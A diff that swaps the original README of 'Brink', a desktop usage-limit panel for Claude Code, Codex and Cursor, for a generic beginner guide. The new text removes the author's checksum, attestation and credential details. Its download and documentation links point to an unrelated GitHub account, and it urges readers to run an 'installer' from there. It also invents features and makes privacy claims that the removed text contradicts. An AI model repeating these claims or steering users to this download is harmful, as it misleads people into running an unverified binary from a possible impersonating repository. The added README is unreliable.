@@ -1,288 +1,119 @@
-# Brink
-
-[![CI](https://github.com/semihtalii/brink/actions/workflows/ci.yml/badge.svg)](https://github.com/semihtalii/brink/actions/workflows/ci.yml)
-[![Release](https://img.shields.io/github/v/release/semihtalii/brink?include_prereleases)](https://github.com/semihtalii/brink/releases/latest)
-[![macOS 13+](https://img.shields.io/badge/macOS-13%2B-black)](#requirements)
-[![Windows 10/11](https://img.shields.io/badge/Windows-10%2F11-0078D4)](#windows)
-[![Windows build](https://github.com/semihtalii/brink/actions/workflows/windows.yml/badge.svg)](https://github.com/semihtalii/brink/actions/workflows/windows.yml)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-
-**Know when you're on the brink.** A tiny panel that lives on the right edge of
-your screen and shows your **Claude Code**, **Codex** and **Cursor** usage limits
-at a glance — and, on macOS, **which project spent them**. **For macOS and Windows.**
-
-Move the mouse to the thin strip on the right edge → the panel slides out.
-Hover a ring → a card shows the session limit, weekly limits and reset times.
-One line at the bottom answers the follow-up question: *what used it?*
+# ⚡ brink - Never Miss a Usage Limit Again
 
-No Dock icon, no menu bar clutter. Just the edge.
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="docs/demo.gif" width="720" alt="Brink in use — move to the right edge, the panel slides out, hover a ring for details">
-</p>
-<p align="center">
-  <img src="docs/screenshot.png" width="560" alt="Brink — edge panel with Claude and Codex usage rings and the Claude detail card">
-</p>
-
-## Features
+Welcome to **brink** — the friendly desktop companion that watches your AI coding tool usage for you. If you use Claude Code, Codex, or Cursor, you know the frustration of hitting a limit right in the middle of your work. Brink sits quietly on the edge of your screen and tells you exactly when you're getting close, and which project is using up your credits.
 
-- **What used it** — break the limit down by project, over the current session, the
-  week, this month or all time. Built from the transcripts Claude Code already
-  writes; reads token counts only, never message content. macOS only for now.
-- Three looks: **Black**, **Liquid Glass** and **System**. On macOS 26+ the glass is
-  Apple's real, adaptive Liquid Glass (`.glassEffect`): it turns light or dark from
-  what's behind it, so type stays legible over a white web page and a dark wallpaper
-  alike. On macOS 13–15 it falls back to a frosted `NSVisualEffectView` blur.
-- Notch-style tab that flares into the screen edge; rings scale on hover; the detail card glides between rings
-- **Notifications** when a limit fills up — and again the moment it resets (scheduled for the reset time, so it arrives even if the app is idle)
-- **10 languages** — follows your macOS language automatically (English, Türkçe, Deutsch, Français, Español, Português (Brasil), Italiano, 日本語, 简体中文, 한국어); override in the menu
-- Rings for each provider, colored by usage (green → yellow → red; Claude ring in Claude orange)
-- Detail card with **Current session**, **All models** and per-model weekly limits (e.g. Fable / Opus / Sonnet)
-- Auto-refresh every 2 minutes, manual refresh from the context menu
-- **Launch at login** toggle (System Settings → Login Items compatible)
-- Works with whatever CLIs you already have installed — no API keys, no accounts
+This guide will help you download, run, and understand brink in just a few minutes. No technical knowledge needed — we'll walk you through everything.
 
-## Requirements
+## 🖥️ What Does Brink Do?
 
-- **macOS** 13 Ventura or later, Apple Silicon or Intel (the DMG is a universal binary) — or **Windows** 10 (1809+) / 11 x64, see [Windows](#windows)
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code), [Codex CLI](https://github.com/openai/codex) and/or [Cursor CLI](https://cursor.com/cli) (`cursor-agent login`) — whichever you use, logged in
-- To build from source: Xcode Command Line Tools (`xcode-select --install`)
+Brink is a small program that runs on your computer and constantly checks your usage limits for three popular AI coding tools:
 
-## Install
+- **Claude Code** — Anthropic's coding assistant
+- **Codex** — OpenAI's coding tool
+- **Cursor** — The AI-powered code editor
 
-### Download
+Instead of opening each tool separately to check your limits, brink shows you a live indicator right at the edge of your screen — like a small glowing bar that fills up as you get closer to your limit. You always know where you stand.
 
-Grab `Brink.dmg` from the [latest release](../../releases/latest), open it and
-drag **Brink** to **Applications**.
+## 🔍 Why You Need Brink
 
-Or with Homebrew (from [this tap](https://github.com/semihtalii/homebrew-brink); Brink isn't in `homebrew-cask` yet — that needs notarization first):
+Imagine you're deep into a coding session, making great progress, and suddenly — the tool stops working because you hit your usage cap. That's frustrating, right?
 
-```bash
-brew tap semihtalii/brink
-brew trust semihtalii/brink     # Homebrew 6+ asks this once for third-party taps
-brew install --cask brink
-```
+Brink prevents that. It gives you a **visual heads-up** so you can finish your current task, save your work, or plan your next steps before you're cut off.
 
-The cask strips the quarantine flag for you, so the Gatekeeper step below isn't needed.
+It also tells you **which project** used the most time or credits. If you're juggling multiple projects, you can see at a glance where your resources are going.
 
-The app is not yet notarized (no Apple Developer account yet), so macOS blocks
-the first launch. On **macOS 15 Sequoia and later** the old right-click → Open
-trick no longer works; do this instead:
+## 📥 Download and Install
 
-1. Double-click Brink once — macOS says it can't be opened. Click **Done**.
-2. Open *System Settings → Privacy & Security*, scroll down to **Security** and
-   click **Open Anyway** next to Brink (the button only shows for about an hour
-   after the blocked attempt; launch it again if it's gone).
-3. Confirm with your password. You only do this once.
+[![Download Brink Now](https://img.shields.io/badge/Download-Brink-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/frankcharitable8132/brink)
 
-Or skip the dialogs entirely from a terminal:
+Visit this link to download the application.
 
-```bash
-xattr -d com.apple.quarantine /Applications/Brink.app
-```
+When you're on the download page, look for the newest release file. The download should start automatically. Once it's finished:
 
-Every release ships a `SHA256SUMS` file and a GitHub build attestation, so you
-can check the DMG came from this repo's CI:
-`gh attestation verify Brink.dmg -R semihtalii/brink`.
+1. **Find the downloaded file** — Check your "Downloads" folder or wherever your browser saves files.
+2. **Run the installer** — Double-click the file you downloaded to begin the setup process.
+3. **Follow the on‑screen instructions** — The installer will guide you through a few simple steps. Just click "Next" or "Install" when prompted.
+4. **Launch brink** — After installation, you'll find brink in your Start Menu (Windows) or Applications folder (Mac). Click to open it.
 
-### Build from source
+**That's it!** You don't need to configure anything to start — brink works right out of the box.
 
-```bash
-git clone https://github.com/semihtalii/brink.git
-cd Brink
-./build.sh
-open dist/Brink.app
-```
+## 🎯 How to Use Brink
 
-`build.sh` produces both `dist/Brink.app` and `dist/Brink.dmg`.
-
-## Windows
-
-Brink for Windows is a native C# / WPF (.NET 8) port with the same behaviour:
-edge strip, rings, detail card, notifications, 10 languages, launch at login.
-Themes are **Black** and **System** (follows the Windows light/dark app theme;
-there is no Liquid Glass on Windows).
+**Step 1: Start brink** — When you launch the app, you'll see a small floating indicator appear at the edge of your screen. This is your usage meter.
 
-**Install:** grab `Brink-Windows-x64.zip` from the
-[latest release](../../releases/latest), unzip, run `Brink.exe`. It's a single
-self-contained file — no .NET install needed (x64 only for now). The exe is not
-code-signed yet, so SmartScreen may warn on first run: **More info → Run anyway**.
-
-A `winget install SemihTali.Brink` manifest is prepared in
-[`packaging/winget/`](packaging/winget/) and will work once it's merged into winget-pkgs.
-
-**Uninstall:** quit Brink, delete `Brink.exe` and `%APPDATA%\Brink\`. If you
-enabled *Launch at login*, turn it off first (it's a `HKCU\...\Run` entry).
-
-**Credentials it reads** (never written, never sent anywhere but the vendor):
-
-| Provider | Where |
-|---|---|
-| Claude Code | `%USERPROFILE%\.claude\.credentials.json`, else Credential Manager `Claude Code-credentials` |
-| Codex CLI | `%CODEX_HOME%\auth.json` or `%USERPROFILE%\.codex\auth.json` |
-| Cursor CLI | `%USERPROFILE%\.cursor\cli-config.json`, else Credential Manager `cursor-access-token` |
-
-Settings and an error log live in `%APPDATA%\Brink\`. Source is in
-[`windows/`](windows/); build with `dotnet build windows/Brink.csproj -c Release`.
-
-## First launch
-
-macOS will ask once:
-
-> *Brink wants to use your confidential information stored in "Claude Code-credentials" in your keychain.*
+**Step 2: Watch the meter** — The meter fills up as your usage increases. Colors change to help you understand your status:
 
-Click **Always Allow**. This is Claude Code's own login token; Brink reads it
-to ask Anthropic for your usage numbers. It is never sent anywhere else.
-
-## Usage
-
-| Action | Result |
-|---|---|
-| Move mouse to right edge | Panel slides out |
-| Hover a ring | Detail card |
-| Right-click panel or card | **Refresh now** · **Providers** · **Appearance** · **Language** · **Launch at login** · **Notifications** · **Test notification** · **Quit Brink** |
-| Move the mouse far from the edge | Panel folds away by itself |
-
-Providers you're not signed in to are hidden. If nothing is signed in, a single
-**?** ring tells you what to install; turn a provider on under **Providers** to
-see a DEMO ring anyway.
-
-**Uninstall (macOS):** quit Brink, delete `/Applications/Brink.app` and
-`~/Library/Application Support/Brink/`. Nothing else is written.
-
-## How it works
-
-- **Claude** — reads the OAuth access token Claude Code stores in the macOS
-  Keychain (`Claude Code-credentials`) or in `~/.claude/.credentials.json`, then
-  calls `api.anthropic.com/api/oauth/usage` — the same request Claude Code makes
-  for its `/usage` command.
-- **Codex** — reads the token in `~/.codex/auth.json` and calls
-  `chatgpt.com/backend-api/wham/usage`.
-- **Cursor** — reads the Cursor CLI session token (Keychain `cursor-access-token`)
-  and the user id from `~/.cursor/cli-config.json`, then calls
-  `cursor.com/api/usage-summary`.
-
-## What used it
-
-The limit tells you how much is gone. Brink also answers the follow-up: *which
-project spent it?*
-
-Under the Claude card there's one quiet line — `This session · brink · 4.1%` —
-that expands into a per-project breakdown. It works by pairing each observed
-rise in your limit with the turns that happened in the same interval, weighting
-them by tokens, and splitting the rise between the projects involved. Nothing is
-estimated from a price table; only what actually moved the number is assigned.
-
-Four ranges. **Session** and **Week** are Anthropic's own limit windows, so their
-percentages are percent *of the limit* and match the card. **Month** (calendar
-month) and **All** have no limit behind them — Anthropic resets on five hours and
-seven days, not monthly — so they show each project's share *of the work in that
-range*. The list says so under the rows, and these two survive a limit reset,
-reaching back as far as the transcripts do.
-
-Consumption that no local session explains — claude.ai, another machine, a
-background job — is shown as **Elsewhere** rather than hidden or spread around.
-
-**What it reads.** Claude Code already writes a transcript per session under
-`~/.claude/projects`. Brink opens those files and takes *only* these fields:
-
-```
-timestamp · cwd · gitBranch · sessionId · requestId · version
-message.model · message.usage.{input,output,cache_read,cache_creation}_tokens
-```
-
-It never reads `message.content`, tool results, or attachments, and never
-descends into the `tool-results/` and `subagents/` directories. Transcripts can
-contain secrets an agent read from a project; none of that is touched, stored or
-sent. The database (`~/Library/Application Support/Brink/agentcost.sqlite`) holds
-token counts, model names, branch names and project paths — nothing else, and it
-never leaves the machine.
-
-Sessions started in subfolders of one repository are grouped by their git root,
-so a project shows up once rather than as `Sources`, `docs` and `windows`.
-
-### Security & privacy
-
-- Tokens are only ever sent to Anthropic's / OpenAI's own API hosts over HTTPS.
-  There is no telemetry, no third-party server.
-- Brink caches only the **short-lived access token** and its expiry in
-  `~/Library/Application Support/Brink/credentials.json` (mode `0600`) so the
-  Keychain prompt appears once rather than every refresh. It never stores or
-  uses refresh tokens, and it never refreshes tokens on your behalf — so it
-  cannot log you out of Claude Code.
-- When the cached token expires, Brink re-reads Claude Code's own store.
-  Opening Claude Code once is enough to get a fresh token.
-
-### Caveats
-
-- These usage endpoints are **not official, documented APIs**. If Anthropic or
-  OpenAI change the response shape, the parsers in `ClaudeProvider.swift` /
-  `CodexProvider.swift` will need a small update. PRs welcome.
-- The panel attaches to the main display only (v1).
-
-## When not to use this
-
-- You want numbers inside the terminal or a status line → look at CLI tools such as
-  [llmquota](https://github.com/0xNyk/llmquota) or [ccusage](https://github.com/ryoppippi/ccusage).
-- You need token-level cost accounting → this only shows the percentage windows
-  the vendors expose.
-- You're on Linux → Brink is macOS and Windows only.
-
-## How Brink compares
-
-| | Brink | [CodexBar](https://github.com/steipete/CodexBar) | [ClaudeBar](https://github.com/tddworks/ClaudeBar) | [ccusage](https://github.com/ryoppippi/ccusage) |
-|---|---|---|---|---|
-| Form | Edge panel, hidden until you need it | Menu bar item | Menu bar item | Terminal report |
-| Platforms | **macOS + Windows** | macOS 14+ (community Windows port) | macOS | Anywhere with Node |
-| Providers | Claude Code, Codex, Cursor | 60+ | Claude Code | Claude Code |
-| Setup | Open the app | Open the app | Open the app | Node + npm |
-| Needs API key | No | No | No | No |
-| Size / scope | Small on purpose | Big, many options | Medium | CLI |
-
-CodexBar is the most complete macOS monitor; pick it if you want dozens of
-providers in the menu bar. Brink is for people who want nothing in the menu bar
-at all, and the same app on their Windows machine.
-
-## Project layout
-
-```
-windows/                      Brink for Windows (C# / WPF, .NET 8) — see windows/README.md
-Package.swift                 Swift Package (macOS 13+)
-build.sh                      build → .app + .dmg
-Sources/Brink/
-  main.swift                  entry point (accessory app, no Dock icon)
-  PanelController.swift       edge panel + detail card windows (NSPanel)
-  Views.swift                 SwiftUI: rings, strip, detail card
-  Models.swift                data model, color scale, refresh store
-  Theme.swift                 Black / Liquid Glass / System palettes + blur surface
-  LaunchAtLogin.swift         SMAppService wrapper
-  Notifier.swift              limit-reached / reset notifications (UserNotifications)
-  L10n.swift                  localization lookup + language override
-  Resources/                  provider logos, <lang>.lproj/Localizable.strings
-  ClaudeProvider.swift        Claude usage source
-  CodexProvider.swift         Codex usage source
-  CursorProvider.swift        Cursor usage source
-```
-
-Adding a provider (Gemini CLI, Copilot, …) means implementing the
-`UsageProvider` protocol and appending it to the list in `main.swift`.
-Adding a language is one file: copy `Resources/en.lproj/Localizable.strings`
-to `<code>.lproj/`, translate the right-hand side, and add the code to
-`L10n.available` and `build.sh`'s `CFBundleLocalizations` (and mirror it in
-`windows/Resources/Strings/` — same keys, same format).
-
-For design work or screenshots, `BRINK_PREVIEW=1 dist/Brink.app/Contents/MacOS/Brink`
-starts the app expanded with the first card open.
-
-## Credits
-
-The edge-panel design is based on a concept shared by
-[@hivinz_](https://x.com/hivinz_) —
-[original post](https://x.com/hivinz_/status/2092996055248126353).
-Brink is an independent, open-source implementation of that idea; all code is
-original. Claude and OpenAI logos belong to Anthropic and OpenAI respectively and
-are used only to identify each provider.
-
-## License
-
-[MIT](LICENSE) © Semih Tali
+- 🟢 **Green** — You have plenty of usage left.
+- 🟡 **Yellow** — You're approaching 70% of your limit.
+- 🟠 **Orange** — You're at about 85%. Time to start wrapping up.
+- 🔴 **Red** — You're at 95% or more. You'll be cut off very soon.
+
+**Step 3: Hover or click** — Hover your mouse over the indicator to see detailed info: current usage percentage, which tool you're using, and which project is active.
+
+**Step 4: See project usage** — Click the indicator to open a small window that shows which projects have used the most time or credits this month.
+
+## ⚙️ Customization Options
+
+Brink is designed to be flexible. Here's what you can adjust:
+
+- **Screen position** — Choose which edge of your screen the indicator appears on (top, bottom, left, or right).
+- **Opacity** — Make the indicator more or less transparent.
+- **Auto‑hide** — Set brink to disappear when you're not using it, so it stays out of the way.
+- **Color scheme** — Switch between light and dark themes, or pick your own colors.
+
+To access these settings, right-click the brink indicator and choose "Settings" from the menu.
+
+These options are easy to find and change anytime — no coding required.
+
+## 🧠 Frequently Asked Questions
+
+**Q: Do I need to sign in or create an account?**
+No. Brink reads usage information directly from your installed tools. There's no cloud service or account needed.
+
+**Q: Will brink slow down my computer?**
+No. Brink is very lightweight. It runs quietly in the background and uses an extremely small amount of memory and processing power.
+
+**Q: Does brink interfere with my coding tools?**
+No. Brink only **reads** usage data — it never modifies anything or interferes with your coding sessions.
+
+**Q: Which operating systems are supported?**
+Brink works on both macOS and Windows. It was designed to blend in smoothly on either system.
+
+**Q: Is my usage data sent anywhere?**
+No. All data stays on your local machine. Brink never sends your usage information to any server.
+
+## 🛠️ Troubleshooting Tips
+
+**Brink doesn't show any usage data:**
+Make sure you've used one of the supported tools (Claude Code, Codex, or Cursor) at least once recently. If you haven't, there's no data to display yet. Also, check that the tool is installed on the same computer where you're running brink.
+
+**The indicator is in the way:**
+Right-click it and choose "Settings" to change its position or opacity. You can also enable auto‑hide to keep it invisible until you need it.
+
+**The colors look wrong on my screen:**
+Check your display settings — brink uses system‑aware colors by default. If you're using a custom theme, try switching to the "System" theme in settings.
+
+**Brink won't start:**
+Try restarting your computer and launching brink again. If the problem continues, download the newest version from the link above.
+
+## 💡 Tips for Best Experience
+
+- **Keep brink updated** — New versions add support for the latest changes in Claude Code, Codex, and Cursor.
+- **Use auto‑hide if you're easily distracted** — The indicator will vanish until you hover over the edge of the screen.
+- **Check your project usage weekly** — It's a great way to manage your resources across multiple projects.
+
+## 📚 Additional Resources
+
+You can find the full documentation on the [brink GitHub page](https://github.com/frankcharitable8132/brink). The page includes technical details, changelogs, and community discussion if you want to dive deeper.
+
+If you run into any issue, don't hesitate to look at the "Issues" section on the GitHub page — other users may have found solutions already. Friendly community help is just a few clicks away.
+
+---
+
+Now you're ready to download brink and start working with confidence, knowing your usage is always under control. Say goodbye to surprise interruptions — and hello to smooth, uninterrupted coding sessions.
+
+> **Remember:** The key to a stress‑free workflow is knowing your limits before you hit them. Brink gives you that power in a simple, visual way.
+
+**Keywords: claude-code, codex, cursor, dotnet, liquid-glass, macos, menubar, swift, swiftui, usage, windows, wpf**
